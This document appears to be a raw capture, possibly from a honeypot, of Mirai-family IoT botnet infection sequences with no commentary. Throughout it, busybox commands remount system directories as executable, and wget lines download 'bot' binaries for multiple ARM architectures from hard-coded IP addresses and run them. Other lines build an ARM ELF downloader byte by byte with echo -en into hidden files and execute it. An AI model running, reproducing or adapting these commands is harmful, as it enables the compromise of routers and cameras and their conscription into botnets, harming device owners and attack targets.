+/bin/busybox wget; /bin/busybox tftp; /bin/busybox FBOT
+/bin/busybox cp /bin/busybox .d && >.d && /bin/busybox chmod 777 .d && /bin/busybox cp /bin/busybox .b && >.b && /bin/busybox chmod 777 .b
+/bin/busybox wget http://195.62.53.96/bot.armeb -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.armeb; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm4 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm4; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm5 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm5; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm6 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm6; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm7 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm7; >.b
+/bin/busybox wget http://195.62.53.96/bot.aarch64 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.aarch64; >.b
+/bin/busybox cp /bin/busybox .d && >.d && /bin/busybox chmod 777 .d && /bin/busybox cp /bin/busybox .b && >.b && /bin/busybox chmod 777 .b
+/bin/busybox echo -en '\x7f\x45\x4c\x46\x01\x01\x01\x61\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x28\x00\x01\x00\x00\x00\x20\x83\x00\x00\x34\x00\x00\x00\xe4\x03\x00\x00\x02\x02\x00\x00\x34\x00\x20\x00\x02\x00\x28\x00\x05\x00\x04\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00' > .d && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+sh
+shell
+enable
+system
+/bin/busybox SATORI
+/bin/busybox cat /bin/busybox || while read i; do /bin/busybox echo $i; done < /bin/busybox || /bin/busybox dd if=/bin/busybox bs=22 count=1
+sh
+shell
+enable
+system
+/bin/busybox SATORI
+mkdir /tmp; mount -o remount,rw,exec /tmp; >/tmp/.s && cd /tmp
+mkdir /var; mount -o remount,rw,exec /var; >/var/.s && cd /var
+mkdir /dev; mount -o remount,rw,exec /dev; >/dev/.s && cd /dev
+mkdir /mnt; mount -o remount,rw,exec /mnt; >/mnt/.s && cd /mnt
+mkdir /var/run; mount -o remount,rw,exec /var/run; >/var/run/.s && cd /var/run
+mkdir /var/tmp; mount -o remount,rw,exec /var/tmp; >/var/tmp/.s && cd /var/tmp
+mkdir /; mount -o remount,rw,exec /; >//.s && cd /
+mkdir /dev/netslink; mount -o remount,rw,exec /dev/netslink; >/dev/netslink/.s && cd /dev/netslink
+mkdir /dev/shm; mount -o remount,rw,exec /dev/shm; >/dev/shm/.s && cd /dev/shm
+mkdir /bin; mount -o remount,rw,exec /bin; >/bin/.s && cd /bin
+mkdir /etc; mount -o remount,rw,exec /etc; >/etc/.s && cd /etc
+mkdir /boot; mount -o remount,rw,exec /boot; >/boot/.s && cd /boot
+mkdir /usr; mount -o remount,rw,exec /usr; >/usr/.s && cd /usr
+mkdir /sys; mount -o remount,rw,exec /sys; >/sys/.s && cd /sys
+/bin/busybox wget; /bin/busybox tftp; /bin/busybox FBOT
+/bin/busybox cp /bin/busybox .d && >.d && /bin/busybox chmod 777 .d && /bin/busybox cp /bin/busybox .b && >.b && /bin/busybox chmod 777 .b
+/bin/busybox wget http://195.62.53.96/bot.armeb -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.armeb; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm4 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm4; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm5 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm5; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm6 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm6; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm7 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm7; >.b
+/bin/busybox wget http://195.62.53.96/bot.aarch64 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.aarch64; >.b
+/bin/busybox cp /bin/busybox .d && >.d && /bin/busybox chmod 777 .d && /bin/busybox cp /bin/busybox .b && >.b && /bin/busybox chmod 777 .b
+/bin/busybox echo -en '\x7f\x45\x4c\x46\x01\x01\x01\x61\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x28\x00\x01\x00\x00\x00\x20\x83\x00\x00\x34\x00\x00\x00\xe4\x03\x00\x00\x02\x02\x00\x00\x34\x00\x20\x00\x02\x00\x28\x00\x05\x00\x04\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00' > .d && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+sh
+shell
+enable
+system
+/bin/busybox SATORI
+/bin/busybox cat /bin/busybox || while read i; do /bin/busybox echo $i; done < /bin/busybox || /bin/busybox dd if=/bin/busybox bs=22 count=1
+sh
+shell
+enable
+system
+/bin/busybox SATORI
+mkdir /tmp; mount -o remount,rw,exec /tmp; >/tmp/.s && cd /tmp
+mkdir /var; mount -o remount,rw,exec /var; >/var/.s && cd /var
+mkdir /dev; mount -o remount,rw,exec /dev; >/dev/.s && cd /dev
+mkdir /mnt; mount -o remount,rw,exec /mnt; >/mnt/.s && cd /mnt
+mkdir /var/run; mount -o remount,rw,exec /var/run; >/var/run/.s && cd /var/run
+mkdir /var/tmp; mount -o remount,rw,exec /var/tmp; >/var/tmp/.s && cd /var/tmp
+mkdir /; mount -o remount,rw,exec /; >//.s && cd /
+mkdir /dev/netslink; mount -o remount,rw,exec /dev/netslink; >/dev/netslink/.s && cd /dev/netslink
+mkdir /dev/shm; mount -o remount,rw,exec /dev/shm; >/dev/shm/.s && cd /dev/shm
+mkdir /bin; mount -o remount,rw,exec /bin; >/bin/.s && cd /bin
+mkdir /etc; mount -o remount,rw,exec /etc; >/etc/.s && cd /etc
+mkdir /boot; mount -o remount,rw,exec /boot; >/boot/.s && cd /boot
+mkdir /usr; mount -o remount,rw,exec /usr; >/usr/.s && cd /usr
+mkdir /sys; mount -o remount,rw,exec /sys; >/sys/.s && cd /sys
+/bin/busybox wget; /bin/busybox tftp; /bin/busybox FBOT
+/bin/busybox cp /bin/busybox .d && >.d && /bin/busybox chmod 777 .d && /bin/busybox cp /bin/busybox .b && >.b && /bin/busybox chmod 777 .b
+/bin/busybox wget http://195.62.53.96/bot.armeb -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.armeb; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm4 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm4; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm5 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm5; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm6 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm6; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm7 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm7; >.b
+/bin/busybox wget http://195.62.53.96/bot.aarch64 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.aarch64; >.b
+/bin/busybox cp /bin/busybox .d && >.d && /bin/busybox chmod 777 .d && /bin/busybox cp /bin/busybox .b && >.b && /bin/busybox chmod 777 .b
+/bin/busybox echo -en '\x7f\x45\x4c\x46\x01\x01\x01\x61\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x28\x00\x01\x00\x00\x00\x20\x83\x00\x00\x34\x00\x00\x00\xe4\x03\x00\x00\x02\x02\x00\x00\x34\x00\x20\x00\x02\x00\x28\x00\x05\x00\x04\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00' > .d && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+enable
+system
+shell
+sh
+/bin/busybox SATORI
+/bin/busybox cat /bin/busybox || while read i; do /bin/busybox echo ; done < /bin/busybox || /bin/busybox dd if=/bin/busybox bs=22 count=1
+enable
+system
+shell
+sh
+/bin/busybox DMSNA
+/bin/busybox mkdir /tmp/; >/tmp/.file && cd /tmp/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /var/; >/var/.file && cd /var/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /dev/; >/dev/.file && cd /dev/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /mnt/; >/mnt/.file && cd /mnt/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /var/run/; >/var/run/.file && cd /var/run/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /var/tmp/; >/var/tmp/.file && cd /var/tmp/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /; >/.file && cd /
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /dev/netslink/; >/dev/netslink/.file && cd /dev/netslink/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /dev/shm/; >/dev/shm/.file && cd /dev/shm/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /bin/; >/bin/.file && cd /bin/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /etc/; >/etc/.file && cd /etc/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /boot/; >/boot/.file && cd /boot/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /usr/; >/usr/.file && cd /usr/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /sys/; >/sys/.file && cd /sys/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox wget; /bin/busybox tftp; /bin/busybox HGYQA
+/bin/busybox cp /bin/busybox .z; >.z; /bin/busybox chmod 777 .z
+/bin/busybox wget http://141.98.119.27:80/batkek/arm -O -> .z; /bin/busybox chmod 777 .z; ./.z telnet.arm.wget; >.z
+/bin/busybox wget http://141.98.119.27:80/batkek/arm7 -O -> .z; /bin/busybox chmod 777 .z; ./.z telnet.arm7.wget; >.z
+enable
+system
+shell
+sh
+/bin/busybox mkdir /tmp/; >/tmp/.file && cd /tmp/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /var/; >/var/.file && cd /var/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /dev/; >/dev/.file && cd /dev/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /mnt/; >/mnt/.file && cd /mnt/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /var/run/; >/var/run/.file && cd /var/run/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /var/tmp/; >/var/tmp/.file && cd /var/tmp/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /; >/.file && cd /
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /dev/netslink/; >/dev/netslink/.file && cd /dev/netslink/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /dev/shm/; >/dev/shm/.file && cd /dev/shm/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /bin/; >/bin/.file && cd /bin/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /etc/; >/etc/.file && cd /etc/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /boot/; >/boot/.file && cd /boot/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /usr/; >/usr/.file && cd /usr/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /sys/; >/sys/.file && cd /sys/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox cp /bin/busybox .x; /bin/busybox cp /bin/busybox .z; >.x; >.z; /bin/busybox chmod 777 .x .z
+/bin/busybox echo -en '\x7f\x45\x4c\x46\x01\x01\x01\x61\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x28\x00\x01\x00\x00\x00\x38\x81\x00\x00\x34\x00\x00\x00\x38' > .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x03\x00\x00\x02\x02\x00\x00\x34\x00\x20\x00\x02\x00\x28\x00\x06\x00\x05\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x80' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x00\x00\xf8\x02\x00\x00\xf8\x02\x00\x00\x05\x00\x00\x00\x00\x80\x00\x00\x01\x00\x00\x00\xf8\x02\x00\x00\xf8\x02\x01\x00\xf8\x02\x01' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x00\x00\x00\x00\x00\x08\x00\x00\x00\x06\x00\x00\x00\x00\x80\x00\x00\x00\x10\xa0\xe1\x00\x00\x9f\xe5\x84\x00\x00\xea\x01\x00\x90\x00' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x00\x10\xa0\xe1\x00\x00\x9f\xe5\x80\x00\x00\xea\x06\x00\x90\x00\x01\xc0\xa0\xe1\x00\x10\xa0\xe1\x08\x00\x9f\xe5\x02\x30\xa0\xe1\x0c' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x20\xa0\xe1\x79\x00\x00\xea\x05\x00\x90\x00\x04\xe0\x2d\xe5\x0c\xd0\x4d\xe2\x07\x00\x8d\xe8\x03\x10\xa0\xe3\x0d\x20\xa0\xe1\x08\x00' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x9f\xe5\x71\x00\x00\xeb\x0c\xd0\x8d\xe2\x00\x80\xbd\xe8\x66\x00\x90\x00\x01\xc0\xa0\xe1\x00\x10\xa0\xe1\x08\x00\x9f\xe5\x02\x30\xa0' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\xe1\x0c\x20\xa0\xe1\x68\x00\x00\xea\x04\x00\x90\x00\x01\xc0\xa0\xe1\x00\x10\xa0\xe1\x08\x00\x9f\xe5\x02\x30\xa0\xe1\x0c\x20\xa0\xe1' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x61\x00\x00\xea\x03\x00\x90\x00\x04\xe0\x2d\xe5\x0c\xd0\x4d\xe2\x07\x00\x8d\xe8\x01\x10\xa0\xe3\x0d\x20\xa0\xe1\x08\x00\x9f\xe5\x59' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x00\x00\xeb\x0c\xd0\x8d\xe2\x00\x80\xbd\xe8\x66\x00\x90\x00\xf0\x41\x2d\xe9\x34\x31\x9f\xe5\x94\xd0\x4d\xe2\x00\x80\xa0\xe3\x00\x00' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x00\xea\x01\x80\x88\xe2\x01\x60\x53\xe5\x00\x00\x56\xe3\x01\x30\x83\xe2\xfa\xff\xff\x1a\x50\x30\xa0\xe3\x83\x30\xcd\xe5\x0c\x31\x9f' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\xe5\x02\x40\xa0\xe3\x08\x11\x9f\xe5\x08\x21\x9f\xe5\x08\x01\x9f\xe5\x84\x30\x8d\xe5\x80\x40\xcd\xe5\x81\x60\xcd\xe5\x82\x60\xcd\xe5' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\xc0\xff\xff\xeb\x01\x10\xa0\xe3\x00\x70\xa0\xe1\x06\x20\xa0\xe1\x04\x00\xa0\xe1\xda\xff\xff\xeb\x01\x00\x70\xe3\x01\x00\x77\x13\x00' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x50\xa0\xe1\x01\x00\xa0\x03\xae\xff\xff\x0b\x05\x00\xa0\xe1\x80\x10\x8d\xe2\x10\x20\xa0\xe3\xb9\xff\xff\xeb\x00\x00\x50\xe3\x00\x00' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x60\xb2\xa7\xff\xff\xbb\x19\x40\x88\xe2\x05\x00\xa0\xe1\xa8\x10\x9f\xe5\x04\x20\xa0\xe1\xbb\xff\xff\xeb\x04\x00\x50\xe1\x03\x00\xa0' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x13\x9f\xff\xff\x1b\x94\x80\x9f\xe5\x06\x40\xa0\xe1\x93\x60\x8d\xe2\x06\x10\xa0\xe1\x01\x20\xa0\xe3\x05\x00\xa0\xe1\xb8\xff\xff\xeb' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x01\x00\x50\xe3\x04\x00\xa0\xe3\x95\xff\xff\x1b\x93\x30\xdd\xe5\x04\x44\x83\xe1\x08\x00\x54\xe1\xf4\xff\xff\x1a\x0d\x40\xa0\xe1\x0d' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x10\xa0\xe1\x80\x20\xa0\xe3\x05\x00\xa0\xe1\xac\xff\xff\xeb\x00\x20\x50\xe2\x0d\x10\xa0\xe1\x07\x00\xa0\xe1\x01\x00\x00\xda\xa0\xff' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\xff\xeb\xf5\xff\xff\xea\x05\x00\xa0\xe1\x88\xff\xff\xeb\x07\x00\xa0\xe1\x86\xff\xff\xeb\x05\x00\xa0\xe3\x80\xff\xff\xeb\x94\xd0\x8d' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\xe2\xf0\x81\xbd\xe8\xd1\x82\x00\x00\x8d\x62\x77\x1b\x41\x02\x00\x00\xff\x01\x00\x00\xd4\x82\x00\x00\xd8\x82\x00\x00\x0a\x0d\x0a\x0d' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x70\x40\x2d\xe9\x10\x40\x8d\xe2\x70\x00\x94\xe8\x71\x00\x90\xef\x01\x0a\x70\xe3\x00\x40\xa0\xe1\x70\x80\xbd\x98\x03\x00\x00\xeb\x00' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x30\x64\xe2\x00\x30\x80\xe5\x00\x00\xe0\xe3\x70\x80\xbd\xe8\x00\x00\x9f\xe5\x0e\xf0\xa0\xe1\xf8\x02\x01\x00\x61\x72\x6d\x00\x2e\x7a' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x00\x00\x47\x45\x54\x20\x2f\x62\x61\x74\x6b\x65\x6b\x2f\x61\x72\x6d\x20\x48\x54\x54\x50\x2f\x31\x2e\x30\x0d\x0a\x0d\x0a\x00\x00\x00' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x00\x41\x0f\x00\x00\x00\x61\x65\x61\x62\x69\x00\x01\x05\x00\x00\x00\x00\x2e\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2e\x74\x65\x78\x74' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x00\x2e\x72\x6f\x64\x61\x74\x61\x00\x2e\x62\x73\x73\x00\x2e\x41\x52\x4d\x2e\x61\x74\x74\x72\x69\x62\x75\x74\x65\x73\x00\x00\x00\x00' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x00\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\x74\x80\x00\x00\x74\x00\x00\x00\x5c\x02\x00\x00\x00\x00\x00' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x01\x00\x00\x00\x32\x00\x00\x00\xd0\x82\x00\x00\xd0\x02\x00\x00' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x28\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x01\x00\x00\x00\x19\x00\x00\x00\x08\x00\x00\x00\x03\x00\x00\x00\xf8' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x02\x01\x00\xf8\x02\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x1e\x00\x00\x00\x03\x00' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x00\x70\x00\x00\x00\x00\x00\x00\x00\x00\xf8\x02\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x00\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x03\x00\x00\x2e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x01\x00\x00\x00\x00\x00\x00\x00' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+./.x; ./.z telnet.arm.echo; >.x; >.z
+enable
+system
+shell
+sh
+/bin/busybox mkdir /tmp/; >/tmp/.file && cd /tmp/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /var/; >/var/.file && cd /var/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /dev/; >/dev/.file && cd /dev/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /mnt/; >/mnt/.file && cd /mnt/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /var/run/; >/var/run/.file && cd /var/run/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /var/tmp/; >/var/tmp/.file && cd /var/tmp/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /; >/.file && cd /
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /dev/netslink/; >/dev/netslink/.file && cd /dev/netslink/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /dev/shm/; >/dev/shm/.file && cd /dev/shm/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /bin/; >/bin/.file && cd /bin/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /etc/; >/etc/.file && cd /etc/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /boot/; >/boot/.file && cd /boot/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /usr/; >/usr/.file && cd /usr/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /sys/; >/sys/.file && cd /sys/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox cp /bin/busybox .x; /bin/busybox cp /bin/busybox .z; >.x; >.z; /bin/busybox chmod 777 .x .z
+/bin/busybox echo -en '\x7f\x45\x4c\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x28\x00\x01\x00\x00\x00\xe4\x81\x00\x00\x34\x00\x00\x00\x34' > .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x04\x00\x00\x02\x00\x00\x04\x34\x00\x20\x00\x04\x00\x28\x00\x07\x00\x06\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x80' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x00\x00\xdc\x03\x00\x00\xdc\x03\x00\x00\x05\x00\x00\x00\x00\x80\x00\x00\x01\x00\x00\x00\xdc\x03\x00\x00\xdc\x03\x01\x00\xdc\x03\x01' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x00\x10\x00\x00\x00\x10\x00\x00\x00\x06\x00\x00\x00\x00\x80\x00\x00\x07\x00\x00\x00\xdc\x03\x00\x00\xdc\x03\x01\x00\xdc\x03\x01\x00' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x00\x00\x00\x00\x08\x00\x00\x00\x04\x00\x00\x00\x04\x00\x00\x00\x51\xe5\x74\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\xe0\x2d\xe5\x00\x10' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\xa0\xe1\x04\xd0\x4d\xe2\x01\x00\xa0\xe3\x9a\x00\x00\xeb\x04\xd0\x8d\xe2\x04\xe0\x9d\xe4\x1e\xff\x2f\xe1\x04\xe0\x2d\xe5\x00\x10\xa0' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\xe1\x04\xd0\x4d\xe2\x06\x00\xa0\xe3\x92\x00\x00\xeb\x04\xd0\x8d\xe2\x04\xe0\x9d\xe4\x1e\xff\x2f\xe1\x04\xe0\x2d\xe5\x01\xc0\xa0\xe1' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x02\x30\xa0\xe1\x00\x10\xa0\xe1\x04\xd0\x4d\xe2\x0c\x20\xa0\xe1\x05\x00\xa0\xe3\x87\x00\x00\xeb\x04\xd0\x8d\xe2\x04\xe0\x9d\xe4\x1e' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\xff\x2f\xe1\x04\xe0\x2d\xe5\x01\xc0\xa0\xe1\x02\x30\xa0\xe1\x00\x10\xa0\xe1\x04\xd0\x4d\xe2\x0c\x20\xa0\xe1\x0c\x00\x9f\xe5\x7c\x00' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x00\xeb\x04\xd0\x8d\xe2\x04\xe0\x9d\xe4\x1e\xff\x2f\xe1\x1b\x01\x00\x00\x04\xe0\x2d\xe5\x01\xc0\xa0\xe1\x02\x30\xa0\xe1\x00\x10\xa0' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\xe1\x04\xd0\x4d\xe2\x0c\x20\xa0\xe1\x04\x00\xa0\xe3\x70\x00\x00\xeb\x04\xd0\x8d\xe2\x04\xe0\x9d\xe4\x1e\xff\x2f\xe1\x04\xe0\x2d\xe5' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x01\xc0\xa0\xe1\x02\x30\xa0\xe1\x00\x10\xa0\xe1\x04\xd0\x4d\xe2\x0c\x20\xa0\xe1\x03\x00\xa0\xe3\x65\x00\x00\xeb\x04\xd0\x8d\xe2\x04' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\xe0\x9d\xe4\x1e\xff\x2f\xe1\x04\xe0\x2d\xe5\x01\xc0\xa0\xe1\x02\x30\xa0\xe1\x00\x10\xa0\xe1\x04\xd0\x4d\xe2\x0c\x20\xa0\xe1\x0c\x00' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x9f\xe5\x5a\x00\x00\xeb\x04\xd0\x8d\xe2\x04\xe0\x9d\xe4\x1e\xff\x2f\xe1\x19\x01\x00\x00\xf0\x41\x2d\xe9\x30\x31\x9f\xe5\x98\xd0\x4d' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
